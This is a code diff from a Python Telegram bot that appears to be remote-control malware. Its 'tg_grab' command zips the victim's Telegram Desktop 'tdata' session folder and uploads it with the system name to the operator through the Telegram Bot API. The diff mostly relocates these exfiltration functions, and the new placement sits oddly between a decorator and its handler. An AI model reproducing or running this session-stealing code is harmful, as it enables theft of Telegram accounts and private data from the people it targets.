@@ -285,6 +285,19 @@ def start(message):
     markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
     bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
 @bot.message_handler(commands=['tg_grab'])
+source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
+def send_message_to_group(chat_id):
+    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
+    data = {'chat_id': chat_id, 'text': f"System Name: {system_name}\n"}
+    response = requests.post(url, data=data)
+def send_file_to_telegram(file_path, file_name):
+    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
+    files = {'document': (file_name, open(file_path, 'rb'))}
+    data = {'chat_id': chat_id}
+    response = requests.post(url, files=files, data=data)
+    if response.status_code != 200:
+        print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
+        print(response.text)
 def create_zip_archive(output_zip):
     try:
         with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
@@ -329,19 +342,6 @@ def archive_and_send2():
     else:
         print("Папка 'tdata' не найдена.")
 
-def send_message_to_group(chat_id):
-    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
-    data = {'chat_id': chat_id, 'text': f"System Name: {system_name}\n"}
-    response = requests.post(url, data=data)
-
-def send_file_to_telegram(file_path, file_name):
-    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
-    files = {'document': (file_name, open(file_path, 'rb'))}
-    data = {'chat_id': chat_id}
-    response = requests.post(url, files=files, data=data)
-    if response.status_code != 200:
-        print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
-        print(response.text)
 def handle_tg_grab_command(message):
     thread = threading.Thread(target=archive_and_send2)
     thread.start()
